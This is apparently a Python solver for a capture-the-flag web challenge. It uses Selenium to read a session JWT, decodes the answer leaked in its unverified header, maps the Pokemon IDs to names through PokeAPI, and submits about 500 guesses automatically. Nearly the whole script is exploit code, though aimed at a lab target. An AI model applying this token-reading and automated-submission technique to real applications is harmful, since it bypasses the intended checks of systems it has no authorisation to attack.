import time

import jwt

import requests

import re

from selenium import webdriver

from selenium.webdriver.support.ui import WebDriverWait

from selenium.webdriver.support import expected_conditions as ec

from selenium.webdriver.common.by import By

url = 'http://34.121.84.161:8084'
api= 'https://pokeapi.co/api/v2/pokemon/?limit=1000'

#Open chrome and go to the challenge page
driver = webdriver.Chrome()

driver.get(url)

time.sleep(1) # Let the user actually see something!

#Get a json with all the pokemons infomation
rPokemon = requests.get(api)


#Decodes the cookie and gets the pokemon name 500 times
for x in range(501):

	session_cookie = driver.get_cookie('session')["value"]

	pokeValues = jwt.get_unverified_header(session_cookie)['answer']

	pokemonName = ""

	for x in pokeValues:

		print(x)

		pokemon = re.findall("name\":\"[a-z-]+\",\"url\":\"https://pokeapi.co/api/v2/pokemon/" + str(x) +"/",rPokemon.text)

		pokemonName += re.findall("^[a-z-]+",pokemon[0][7:])[0] + " "




	WebDriverWait(driver, 10).until(ec.element_to_be_clickable((By.ID, "guess")))

	driver.find_element_by_id("guess").send_keys(pokemonName[:-1])

	driver.find_element_by_xpath("//input[@type='submit']").click()


